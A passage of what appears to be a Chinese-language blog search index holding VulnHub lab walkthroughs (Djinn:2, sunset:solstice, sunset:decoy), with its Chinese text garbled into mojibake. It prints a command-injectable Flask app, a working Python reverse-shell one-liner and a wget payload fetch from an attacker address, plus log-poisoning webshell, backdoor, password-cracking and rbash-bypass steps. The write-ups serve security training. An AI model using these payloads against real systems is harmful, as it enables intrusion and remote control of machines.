class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    command = request.args.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> validate(command):</span><br><span class="line">        output = subprocess.Popen(command, shell=<span class="literal">True</span>,</span><br><span class="line">                                  stdout=subprocess.PIPE).stdout.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">&quot;Access Denied!!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>çœ‹æ ·å­è¿‡æ»¤äº†ä¸€äº›å‘½ä»¤ï¼Œå¯ä»¥ç”¨wgetä¸Šä¼ æ–‡ä»¶æ¥ç»•è¿‡</p><p>ä½¿ç”¨çš„payloadä¸º(å› ä¸ºé¶æœºä¸Šé¢çš„nc æ²¡æœ‰<code>-e</code>å‚æ•°ï¼Œpythonç‰ˆæœ¬ä¸º<code>python3</code>)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.2.143&quot;, 9900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>wget+-O+/tmp/a.sh+http://192.168.2.143/shell</code></p><img src="Djinn:2/image-20200720163942603.png" alt="image-20200720163942603" style="zoom:25%;" /><img src="Djinn:2/image-20200720163953505.png" alt="image-20200720163953505" style="zoom:25%;" /><p>ç»™æƒé™<code>chmod+777+/tmp/a.sh</code></p><p>æœ¬åœ°ç›‘å¬ï¼Œè¿è¡Œ<code>/tmp/a.sh</code>ï¼Œå¾—åˆ°ä¸€ä¸ªåå¼¹shell</p><img src="Djinn:2/image-20200720164216528.png" alt="image-20200720164216528" style="zoom:33%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>åœ¨<code>/var/backups</code>ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª<code>nite.kdbx</code>æ–‡ä»¶</p><img src="Djinn:2/image-20200720164518318.png" alt="image-20200720164518318" style="zoom:33%;" /><p><code>.kdbx</code>æ–‡ä»¶ä»‹ç»ï¼š</p><img src="Djinn:2/image-20200720164659679.png" alt="image-20200720164659679" style="zoom:50%;" /><p>æ‰€ä»¥éœ€è¦ä½¿ç”¨<code>KeePass</code>æ‰“å¼€å‘—ï¼Œæ‰“å¼€ä¹‹åè¦å¯†ç </p><p>è¾“å…¥åœ¨ftpæ‰¾åˆ°çš„é‚£ä¸ªå¯†ç ï¼Œå¾—åˆ°<code>nitish</code>çš„å¯†ç <code>&amp;HtMGd$LJB</code></p><img src="Djinn:2/image-20200720164934744.png" alt="image-20200720164934744" style="zoom:33%;" /><p>ä½¿ç”¨sshè¿æ¥ï¼Œæ‰¾ä¸€ä¸‹èƒ½ææƒçš„ç©æ„</p><img src="Djinn:2/image-20200720165226436.png" alt="image-20200720165226436" style="zoom:50%;" /><p>æ‰¾åˆ°ä¸€å°é‚®ä»¶ï¼Œå¯æƒœçœ‹ä¸äº†</p><p><code>netstat -ano | grep &quot;LISTEN&quot; | grep &quot;127&quot;</code>ï¼Œå‘ç°è¿˜å¼€äº†ä¸¤ä¸ªç«¯å£</p><img src="Djinn:2/image-20200720165849066.png" alt="image-20200720165849066" style="zoom:50%;" /><p>ncè¿‡å»çœ‹ä¸€ä¸‹</p><img src="Djinn:2/image-20200720170004332.png" alt="image-20200720170004332" style="zoom:33%;" /><p>å‘½ä»¤5 6 å­˜åœ¨å‘½ä»¤æ³¨å…¥</p><img src="Djinn:2/image-20200720170148396.png" alt="image-20200720170148396" style="zoom:25%;" /><p>é‚£å°±æŠŠä¹‹å‰çš„åå¼¹shellå†™è¿›å»ï¼Œå¾—åˆ°ä¸€ä¸ªshell</p><img src="Djinn:2/image-20200720170448502.png" alt="image-20200720170448502" style="zoom:33%;" /><p>çœ‹ä¸€ä¸‹é‚£ä¸€å°é‚®ä»¶ï¼Œ</p><img src="Djinn:2/image-20200720170705839.png" alt="image-20200720170705839" style="zoom:33%;" /><p>åœ¨<code>ugtan</code>çš„æŸä¸ªç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>clean.sh</code>å³å¯</p><img src="Djinn:2/image-20200720170928863.png" alt="image-20200720170928863" style="zoom:33%;" /><p>ç„¶åç­‰ä¸€ä¼šå„¿å°±ä¼šæ”¶åˆ°shell</p><img src="Djinn:2/image-20200720171355897.png" alt="image-20200720171355897" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> Djinn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> command-injection </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:solsticeé¶æœº</title>
      <link href="/sunset-solstice.html"/>
      <url>/sunset-solstice.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset:solstice é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="sunset-solstice"><a href="#sunset-solstice" class="headerlink" title="sunset:solstice"></a>sunset:solstice</h1><p>æ—¥å¸¸ç•¥è¿‡è¿™ä¿©æ­¥éª¤</p><img src="sunset:solstice/image-20200715143325755.png" alt="image-20200715143325755" style="zoom:33%;" /><img src="sunset:solstice/image-20200715143339999.png" alt="image-20200715143339999" style="zoom:33%;" /><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>è®¿é—®80ç«¯å£</p><img src="sunset:solstice/image-20200715143506650.png" alt="image-20200715143506650" style="zoom:33%;" /><p>æ‰«ç›®å½•ä¹Ÿå•¥éƒ½æ²¡ç”¨</p><p>çœ‹åˆ°ä¸Šé¢è¿˜æœ‰httpç«¯å£â€”â€”8593ï¼Œè®¿é—®ä¸€ä¸‹</p><img src="sunset:solstice/image-20200715143617550.png" alt="image-20200715143617550" style="zoom:33%;" /><p>å…¶ä¸­<code>Book List</code>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p><img src="sunset:solstice/image-20200715143649831.png" alt="image-20200715143649831" style="zoom:33%;" /><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œå‘ç°å¹¶ä¸æ˜¯ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><img src="sunset:solstice/image-20200715143737245.png" alt="image-20200715143737245" style="zoom:25%;" /><p>ç„¶åä½¿ç”¨logæ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°ä¸€ä¸ªåå¼¹shell</p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><img src="sunset:solstice/image-20200715144055207.png" alt="image-20200715144055207" style="zoom:25%;" /><p>ç„¶åå†åˆ©ç”¨æ–‡ä»¶åŒ…å«è®¿é—®<code>access.log</code>å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªwebshell</p><img src="sunset:solstice/image-20200715145103589.png" alt="image-20200715145103589" style="zoom:33%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps -auxwww | grep &quot;root&quot;</span><br><span class="line"></span><br><span class="line">root       572  0.0  0.1   2388   340 ?        Ss   02:48   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br></pre></td></tr></table></figure><p>php -Sâ€”â€”æœ¬åœ°å¼€å¯ä¸€ä¸ªwebserver</p><p>ç„¶å<code>/var/tmp/sv/</code>çš„æƒé™</p><img src="sunset:solstice/image-20200715145421847.png" alt="image-20200715145421847" style="zoom:25%;" /><p><code>index.php</code>æ˜¯å¯å†™çš„ï¼Œå†™å…¥ä¸€ä¸ªåé—¨</p><img src="sunset:solstice/image-20200715145923712.png" alt="image-20200715145923712" style="zoom:25%;" /><p>æœ¬åœ°å¼€å¯ç›‘å¬ä¹‹åï¼Œä½¿ç”¨curlå‘½ä»¤è®¿é—®</p><img src="sunset:solstice/image-20200715150007472.png" alt="image-20200715150007472" style="zoom:33%;" /><p>å¾—åˆ°root</p><img src="sunset:solstice/image-20200715150043954.png" alt="image-20200715150043954" style="zoom:25%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> file-including </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:decoyé¶æœº</title>
      <link href="/sunset-decoy.html"/>
      <url>/sunset-decoy.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset-decoy é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="Sunset-decoy"><a href="#Sunset-decoy" class="headerlink" title="Sunset:decoy"></a>Sunset:decoy</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for decoy (192.168.2.165)</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.165 -A -p0-65535</span><br><span class="line"></span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)</span><br><span class="line">|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)</span><br><span class="line">|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 3.0K  2020-07-07 16:36  save.zip</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Index of /</span><br></pre></td></tr></table></figure><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>å­˜åœ¨ä¸€ä¸ª<code>save.zip</code>ï¼Œç›´æ¥ä¸‹è½½äº†</p><img src="sunset:decoy/image-20200711000206657.png" alt="image-20200711000206657" style="zoom:50%;" /><p>éœ€è¦å¯†ç </p><h2 id="çˆ†ç ´å¯†ç "><a href="#çˆ†ç ´å¯†ç " class="headerlink" title="çˆ†ç ´å¯†ç "></a>çˆ†ç ´å¯†ç </h2><p>ä½¿ç”¨<code>fcrackzip</code>çˆ†ç ´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt ./save.zip </span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == manuel</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†å¯†ç <code>manuel</code>ï¼Œè§£å‹ä¹‹åå¾—åˆ°</p><img src="sunset:decoy/image-20200711000426367.png" alt="image-20200711000426367" style="zoom:50%;" /><p>ç›´æ¥æŸ¥çœ‹<code>passwd</code>å’Œ<code>shadow</code>ï¼Œå‘ç°<code>shadow</code>é‡Œé¢æœ‰ä¸€ä¸ª<code>hash</code></p><img src="sunset:decoy/image-20200711000513705.png" alt="image-20200711000513705" style="zoom:50%;" /><p>ä½¿ç”¨<code>john</code>å·¥å…·çˆ†ç ´</p><img src="sunset:decoy/image-20200711000626023.png" alt="image-20200711000626023" style="zoom:50%;" /><h2 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h2><p>å¾—åˆ°å¯†ç ä¹‹å<code>ssh</code>è¿æ¥ä¸Šå»ï¼Œå‘ç°æ˜¯ä¸€ä¸ª<code>rbash</code>ï¼ˆå›¾ä¸­çš„<code>pspy64</code>æ˜¯æˆ‘åæ¥ä¸Šä¼ ä¸Šå»çš„ï¼‰</p><img src="sunset:decoy/image-20200711000804132.png" alt="image-20200711000804132" style="zoom:50%;" /><p>æˆ‘æ‰¾äº†å¥½å¤šç»•è¿‡rbashçš„æ–¹æ³•éƒ½å¤±è´¥äº†ï¼Œå·å·ç¿»äº†å‚è€ƒç­”æ¡ˆ</p><p>åœ¨sshçš„æ—¶å€™ä½¿ç”¨<code>-t &quot;bash --noprofile&quot;</code>å³å¯ï¼ŒåŸç†å†™åœ¨<a href="#../%E5%B0%8F%E7%9F%A5%E8%AF%86">å°çŸ¥è¯†</a>é‡Œé¢</p><p>æ²¡æœ‰å®Œå…¨ç»•è¿‡ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>/</code> äº†</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æœ¬ç›®å½•ä¸‹é¢æä¾›äº†ä¸€ä¸ª<code>honeypot.decoy</code>æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥åç¼–è¯‘çœ‹äº†çœ‹</p><p><code>main</code>å‡½æ•°è¿è¡Œäº†<code>intro</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">intro</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  lines();</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v0 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;Welcome to the Honey Pot administration manager (HPAM). Please select an option.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;1 Date.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;2 Calendar.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;3 Shutdown.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;4 Reboot.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;5 Launch an AV Scan.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;6 Check /etc/passwd.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v7 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;7 Leave a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;8 Check all services status.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Option selected:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v11);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &lt;= <span class="number">8</span> )</span><br><span class="line">    JUMPOUT(__CS__, (<span class="keyword">char</span> *)dword_22C4 + dword_22C4[v11]);</span><br><span class="line">  v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;No available option was selected. Ending program.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> lines();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œçš„å‘½ä»¤ä»¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">000000212A command         db &#39;&#x2F;usr&#x2F;bin&#x2F;date&#39;,0    ; DATA XREF: intro(void)+234â†‘o</span><br><span class="line">.rodata:0000000000002138 ; char aUsrBinCal[]</span><br><span class="line">.rodata:0000000000002138 aUsrBinCal      db &#39;&#x2F;usr&#x2F;bin&#x2F;cal&#39;,0     ; DATA XREF: intro(void)+245â†‘o</span><br><span class="line">.rodata:0000000000002145                 align 8</span><br><span class="line">.rodata:0000000000002148 aShutdownIsCurr db &#39;Shutdown is currently not available due to not enough privileges.&#39;</span><br><span class="line">.rodata:0000000000002148                                         ; DATA XREF: intro(void)+256â†‘o</span><br><span class="line">.rodata:0000000000002148                 db &#39; Ending program.&#39;,0</span><br><span class="line">.rodata:000000000000219A                 align 20h</span><br><span class="line">.rodata:00000000000021A0 aRebootingIsCur db &#39;Rebooting is currently not available due to not enough privileges&#39;</span><br><span class="line">.rodata:00000000000021A0                                         ; DATA XREF: intro(void)+283â†‘o</span><br><span class="line">.rodata:00000000000021A0                 db &#39;. Ending program.&#39;,0</span><br><span class="line">.rodata:00000000000021F3                 align 8</span><br><span class="line">.rodata:00000000000021F8 ; char aUsrBinTouchDev[]</span><br><span class="line">.rodata:00000000000021F8 aUsrBinTouchDev db &#39;&#x2F;usr&#x2F;bin&#x2F;touch &#x2F;dev&#x2F;shm&#x2F;STTY5246&#39;,0</span><br><span class="line">.rodata:00000000000021F8                                         ; DATA XREF: intro(void)+2ADâ†‘o</span><br><span class="line">.rodata:0000000000002219                 align 20h</span><br><span class="line">.rodata:0000000000002220 aTheAvScanWillB db &#39;The AV Scan will be launched in a minute or less.&#39;,0</span><br><span class="line">.rodata:0000000000002220                                         ; DATA XREF: intro(void)+2B9â†‘o</span><br><span class="line">.rodata:0000000000002252 ; char aUsrBinCatEtcPa[]</span><br><span class="line">.rodata:0000000000002252 aUsrBinCatEtcPa db &#39;&#x2F;usr&#x2F;bin&#x2F;cat &#x2F;etc&#x2F;passwd&#39;,0</span><br><span class="line">.rodata:0000000000002252                                         ; DATA XREF: intro(void)+2E3â†‘o</span><br><span class="line">.rodata:000000000000226B                 align 10h</span><br><span class="line">.rodata:0000000000002270 ; char aUsrBinViTmpCmf[]</span><br><span class="line">.rodata:0000000000002270 aUsrBinViTmpCmf db &#39;&#x2F;usr&#x2F;bin&#x2F;vi &#x2F;tmp&#x2F;cmFuZG9tc2Zvc2FuZm9kYW52cw&#x3D;&#x3D;&#39;,0</span><br><span class="line">.rodata:0000000000002270                                         ; DATA XREF: intro(void)+2F1â†‘o</span><br><span class="line">.rodata:000000000000229E                 align 20h</span><br><span class="line">.rodata:00000000000022A0 ; char aUsrSbinService[]</span><br><span class="line">.rodata:00000000000022A0 aUsrSbinService db &#39;&#x2F;usr&#x2F;sbin&#x2F;service apache2 status&#39;,0</span><br><span class="line">.rodata:00000000000022A0                                         ; DATA XREF: intro(void)+2FFâ†‘o</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†å¤§è‡´çš„æµç¨‹</p><p>åªæœ‰<code>5</code>æ¯”è¾ƒå¯ç–‘äº†</p><p>è¿è¡Œä¹‹åç»“æœ</p><img src="sunset:decoy/image-20200711001348249.png" alt="image-20200711001348249" style="zoom: 25%;" /><p>ä½¿ç”¨<code>pspy64</code>å·¥å…·æŸ¥çœ‹æ—¥å¿—</p><img src="sunset:decoy/image-20200711001425793.png" alt="image-20200711001425793" style="zoom:25%;" /><p>åœ¨åé¢çœ‹åˆ°äº†è¿™ä¸ª</p><p>ç”¨<code>searchsploit</code>æŸ¥æ‰¾ä¸€ä¸‹è„šæœ¬</p><img src="sunset:decoy/image-20200711001507490.png" alt="image-20200711001507490" style="zoom:33%;" /><p>çœ‹ä¸€ä¸‹å†…å®¹</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 